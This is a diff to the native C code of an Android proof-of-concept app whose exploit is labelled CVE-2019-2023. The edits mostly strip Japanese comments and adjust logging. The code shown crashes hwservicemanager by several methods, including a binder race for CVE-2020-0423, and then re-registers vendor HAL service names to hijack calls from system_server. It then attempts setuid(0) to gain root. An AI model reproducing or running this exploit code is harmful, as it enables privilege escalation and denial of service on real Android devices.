@@ -235,14 +235,11 @@ static int trigger_cve_2020_0423(void) {
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) return -1;
 
-    // 子プロセスで大量のトランザクションを送信
     pid_t pid = fork();
     if (pid == 0) {
-        // 子プロセスはすぐに_exitする
         _exit(0);
     } else if (pid > 0) {
         waitpid(pid, NULL, 0);
-        // 親でさらに競合を起こす
         for (int i = 0; i < 100; i++) {
             struct binder_write_read bwr;
             memset(&bwr, 0, sizeof(bwr));
@@ -400,7 +397,6 @@ static int crash_set_context_mgr(void) {
 static int crash_hwservicemanager(void) {
     LOGI("Attempting multiple crash vectors...");
     int ret = 0;
-    // 各ペイロードを複数回実行
     for (int i = 0; i < 3; i++) {
         ret |= crash_with_huge_name();
         usleep(100000);
@@ -474,21 +470,18 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
             if (t->sender_euid == 1000) {
                 LOGI("***** system_server CALLED OUR SERVICE! (uid=1000) *****");
-                // 権限昇格：setuid(0)を試み、結果をファイルに書き込む
                 pid_t pid = fork();
                 if (pid == 0) {
-                    // 子プロセスでsetuidとid実行
+                    // 子プロセスで権限昇格を試みる
                     setuid(0);
                     setresuid(0,0,0);
-                    FILE *fp = fopen(g_output_path, "w");
+                    FILE *fp = fopen(g_output_path, "a");
                     if (fp) {
                         fprintf(fp, "=== Exploit Success ===\n");
-                        fprintf(fp, "UID: %d\n", getuid());
-                        fprintf(fp, "EUID: %d\n", geteuid());
+                        fprintf(fp, "UID after setuid: %d\n", getuid());
+                        fprintf(fp, "EUID after setresuid: %d\n", geteuid());
                         fclose(fp);
                     }
-                    // idコマンドも追記
-                    system("id >> " OUTPUT_PATH " 2>&1");
                     _exit(0);
                 } else if (pid > 0) {
                     wait(NULL);
@@ -562,7 +555,6 @@ static void register_and_serve(const char *service_name) {
 
     pid_t pid = fork();
     if (pid == 0) {
-        // 子プロセスはサーバーループを実行
         binder_server_loop(binder_fd, handle);
         _exit(0);
     } else if (pid > 0) {
@@ -611,7 +603,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
     LOGI("CVE-2019-2023 Ultimate Exploit - Multi-Vector Crash & Hijack");
     LOGI("========================================");
 
-    // ログファイル初期化
     FILE *fp = fopen(g_log_path, "w");
     if (fp) {
         fprintf(fp, "=== Binder Traffic Log ===\n");
@@ -625,7 +616,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Current hwservicemanager PID: %d", g_hwservicemanager_pid);
     }
 
-    // フェーズ1: クラッシュ攻撃（最大5回試行）
     LOGI("Phase 1: Crash hwservicemanager with multiple vectors");
     int crashed = 0;
     for (int i = 0; i < 5 && !crashed; i++) {
@@ -638,7 +628,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Failed to crash hwservicemanager. Continuing anyway...");
     }
 
-    // フェーズ2: 再起動待ち
     LOGI("Phase 2: Wait for hwservicemanager restart");
     int max_wait = 30;
     while (max_wait-- > 0) {
@@ -651,7 +640,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         sleep(1);
     }
 
-    // フェーズ3: 全サービス再登録 & サーバー起動
     LOGI("Phase 3: Register all services and start servers");
     const char *target_services[] = {
         "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
@@ -667,7 +655,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         usleep(300000);
     }
 
-    // フェーズ4: 長時間待機（system_serverからの呼び出しを待つ）
     LOGI("Phase 4: Waiting for system_server to call...");
     LOGI("Running for 180 seconds. Check %s for logs.", g_log_path);
 
@@ -676,7 +663,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         if (g_exploit_success) break;
     }
 
-    // 結果をファイルに書き込む
     if (g_exploit_success) {
         LOGI("Exploit succeeded! Check %s", g_output_path);
         write_result("Exploit succeeded: system_server called our service.");
@@ -684,7 +670,6 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
     } else {
         LOGI("No transaction from system_server received.");
         LOGI("Try manually triggering system events (screen on/off, USB plug, etc.)");
-        // フォールバック: setuid(0)を直接試みる
         if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
             LOGI("setuid(0) succeeded!");
             write_result("Fallback setuid(0) succeeded.");
